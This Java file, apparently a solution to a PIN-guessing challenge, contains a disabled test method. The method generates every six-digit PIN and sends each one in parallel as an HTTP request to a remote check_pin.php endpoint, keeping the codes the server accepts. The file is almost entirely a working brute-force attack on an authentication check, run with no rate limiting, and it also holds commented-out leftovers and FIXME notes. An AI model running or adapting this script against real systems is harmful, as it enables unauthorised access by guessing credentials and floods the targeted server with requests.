package de.axelspringer.ideas.mate.six;

import org.apache.commons.lang3.StringUtils;
import org.springframework.web.client.RestTemplate;

import java.util.ArrayList;
import java.util.List;
import java.util.stream.Collectors;

public class BruteForcePinTest {


    //@Test
    public void bruteFore() throws Exception {
        RestTemplate restTemplate = new RestTemplate();
        long start = System.currentTimeMillis();
        List<String> values = new ArrayList<>();

        for (int i = 0; i < 999999; i++) {
            values.add(StringUtils.leftPad("" + i, 6, "0"));

        }

//        if (i % 100 == 0) {
//            // FIXME Remove System.out
//            System.out.println(i + " in " + ((System.currentTimeMillis() - start) / 1000) + "s");
//        }
//
//        String result = restTemplate.getForObject("http://waschnick.de/check_pin.php?pin=" + , String.class);
//        if ("true".equals(result)) {
//            // FIXME Remove System.out
//            System.out.println(i);
//            break;
//        }

        List<String> result = values.parallelStream()
                .filter(value -> {
                    // FIXME Remove System.out
                    System.out.println(value);
//                    if (System.currentTimeMillis() % 100 == 0) {
//                        System.out.println(value + " in " + ((System.currentTimeMillis() - start) / 1000) + "s");
//                    }
                    return "true".equalsIgnoreCase(restTemplate.getForObject("http://waschnick.de/check_pin.php?pin=" + value, String.class));
                })
                .collect(Collectors.toList());


        // FIXME Remove System.out
        System.out.println("FINISH");

        for (String s : result) {
            // FIXME Remove System.out
            System.out.println("Result: " + s);
        }
    }
}
